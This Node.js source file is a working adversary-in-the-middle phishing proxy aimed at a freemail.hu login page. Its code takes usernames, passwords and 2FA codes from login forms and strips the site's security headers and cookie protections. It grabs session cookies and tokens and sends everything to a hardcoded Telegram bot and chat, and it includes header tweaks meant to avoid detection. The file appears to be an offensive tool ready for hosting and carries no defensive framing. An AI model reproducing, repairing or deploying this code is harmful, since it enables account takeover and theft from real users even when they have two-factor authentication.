const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const https = require('https');
const http = require('http');
const fs = require('fs');

// ============================================
// CONFIGURATION
// ============================================

const TELEGRAM_TOKEN = '8257609367:AAGC6iMZTzOsJEYAlqrFGckKN7T-1pMAS2g';
const CHAT_ID = '7837944828';
const TARGET_URL = 'https://https://accounts.freemail.hu';
const PORT = process.env.PORT || 3000;

const bot = new TelegramBot(TELEGRAM_TOKEN, {polling: false});
const app = express();

// Storage for multi-stage capture
const sessions = new Map();

// ============================================
// HELPER FUNCTIONS
// ============================================

function getClientId(req) {
  return req.ip + req.headers['user-agent'];
}

function getSession(req) {
  const id = getClientId(req);
  if (!sessions.has(id)) {
    sessions.set(id, {
      username: null,
      password: null,
      twofaCode: null,
      sessionToken: null,
      stage: 0,
      startTime: new Date().toISOString()
    });
  }
  return sessions.get(id);
}

function sendToTelegram(data) {
  const message = `🎉 *CAPTURE COMPLETE!*\n\n` +
    `👤 *Username:* \`${data.username || 'N/A'}\`\n` +
    `🔑 *Password:* \`${data.password || 'N/A'}\`\n` +
    `🔢 *2FA:* \`${data.twofaCode || 'N/A'}\`\n\n` +
    `🍪 *Session:* \`\`\`${data.sessionToken || 'N/A'}\`\`\`\n\n` +
    `⏰ *Time:* ${new Date().toLocaleString()}\n` +
    `🌐 *Target:* ${TARGET_URL}\n` +
    `🖥️ *IP:* ${data.ip || 'N/A'}`;

  bot.sendMessage(CHAT_ID, message, {parse_mode: 'Markdown'})
    .then(() => console.log('📱 Sent to Telegram'))
    .catch(err => console.error('Telegram error:', err.message));
}

// ============================================
// MIDDLEWARE - CAPTURE REQUESTS
// ============================================

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// Log and capture all requests
app.use((req, res, next) => {
  const session = getSession(req);
  
  console.log(`[${req.method}] ${req.url} | Stage: ${session.stage}`);
  
  // Capture POST data (login forms)
  if (req.method === 'POST' && req.body) {
    const body = req.body;
    
    // Try multiple field names (different sites use different names)
    const userFields = ['username', 'email', 'user', 'login', 'id', 'account'];
    const passFields = ['password', 'passwd', 'pass', 'pwd', 'secret'];
    const codeFields = ['code', 'otp', 'twofa', '2fa', 'verificationCode', 'token'];
    
    // Capture username
    for (let field of userFields) {
      if (body[field]) {
        session.username = body[field];
        session.stage = Math.max(session.stage, 1);
        console.log('✅ Captured username');
        break;
      }
    }
    
    // Capture password
    for (let field of passFields) {
      if (body[field]) {
        session.password = body[field];
        session.stage = Math.max(session.stage, 2);
        console.log('✅ Captured password');
        break;
      }
    }
    
    // Capture 2FA
    for (let field of codeFields) {
      if (body[field]) {
        session.twofaCode = body[field];
        session.stage = Math.max(session.stage, 3);
        console.log('✅ Captured 2FA');
        break;
      }
    }
  }
  
  next();
});

// ============================================
// PROXY CONFIGURATION
// ============================================

const proxy = createProxyMiddleware({
  target: TARGET_URL,
  changeOrigin: true,
  secure: false,
  ws: true,
  followRedirects: true,
  
  // Fix cookies to work with proxy domain
  cookieDomainRewrite: {
    '*': ''  // Remove domain restriction
  },
  
  // Preserve headers
  headers: {
    'X-Forwarded-Proto': 'https',
    'X-Real-IP': '127.0.0.1'
  },
  
  // Custom router for path preservation
  router: {
    [TARGET_URL]: TARGET_URL
  },
  
  onProxyReq: (proxyReq, req, res) => {
    // Set proper headers to avoid detection
    proxyReq.setHeader('Referer', TARGET_URL);
    proxyReq.setHeader('Origin', TARGET_URL);
    proxyReq.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
    proxyReq.setHeader('Accept-Language', 'en-US,en;q=0.9');
    proxyReq.setHeader('Cache-Control', 'max-age=0');
    
    // Log the forwarded request
    console.log('➡️  Proxying:', req.url);
  },
  
  onProxyRes: (proxyRes, req, res) => {
    const session = getSession(req);
    
    // Remove security headers that block embedding/proxying
    delete proxyRes.headers['x-frame-options'];
    delete proxyRes.headers['content-security-policy'];
    delete proxyRes.headers['content-security-policy-report-only'];
    
    // Fix cookies
    if (proxyRes.headers['set-cookie']) {
      const cookies = proxyRes.headers['set-cookie'];
      
      // Rewrite cookies for proxy compatibility
      proxyRes.headers['set-cookie'] = cookies.map(cookie => {
        return cookie
          .replace(/Domain=[^;]+;?/gi, '')     // Remove domain
          .replace(/SameSite=[^;]+;?/gi, '')   // Remove SameSite
          .replace(/Secure;?/gi, '')          // Remove Secure flag
          .replace(/HttpOnly;?/gi, '');       // Remove HttpOnly (optional)
      });
      
      // Look for session tokens
      const sessionCookie = cookies.find(c => 
        c.toLowerCase().includes('session') || 
        c.toLowerCase().includes('auth') ||
        c.toLowerCase().includes('token') ||
        c.toLowerCase().includes('id') ||
        c.length > 40
      );
      
      if (sessionCookie && session.username) {
        session.sessionToken = sessionCookie;
        session.stage = 4;
        session.ip = req.ip;
        
        console.log('🎉 COMPLETE CAPTURE!');
        console.log('User:', session.username);
        console.log('Pass:', session.password);
        
        // Send to Telegram
        sendToTelegram(session);
        
        // Clean up session after capture
        setTimeout(() => sessions.delete(getClientId(req)), 60000);
      }
    }
    
    // Modify response HTML if needed (inject scripts, etc.)
    // This requires response body interception - see below
  },
  
  onError: (err, req, res) => {
    console.error('❌ Proxy Error:', err.message);
    if (!res.headersSent) {
      res.status(502).json({error: 'Proxy error', message: err.message});
    }
  }
});

// ============================================
// RESPONSE BODY INTERCEPTION (Optional)
// For capturing tokens in JSON responses
// ============================================

const responseInterceptor = require('http-proxy-response-interceptor');

app.use((req, res, next) => {
  // Intercept JSON responses for token extraction
  if (req.method === 'POST') {
    const originalJson = res.json;
    res.json = function(body) {
      // Check if response contains session data
      if (body && (body.token || body.session || body.accessToken)) {
        const session = getSession(req);
        session.sessionToken = body.token || body.session || JSON.stringify(body);
        session.stage = 4;
        sendToTelegram(session);
      }
      return originalJson.call(this, body);
    };
  }
  next();
});

// ============================================
// ROUTES
// ============================================

// Health check
app.get('/health', (req, res) => {
  res.json({status: 'Sam is running', activeSessions: sessions.size});
});

// Main proxy
app.use('/', proxy);

// ============================================
// SERVER START
// ============================================

// HTTP (for Render/Railway)
const server = http.createServer(app);

// WebSocket support
server.on('upgrade', (req, socket, head) => {
  proxy.upgrade(req, socket, head);
});

server.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════════════╗
║   🎭 SAM'S PROXY RUNNING                      ║
║   Port: ${PORT}                               ║
║   Target: ${TARGET_URL}          ║
║   Mode: HTTP (Render compatible)              ║
╚════════════════════════════════════════════════╝
  `);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('Shutting down...');
  server.close(() => process.exit(0));
});
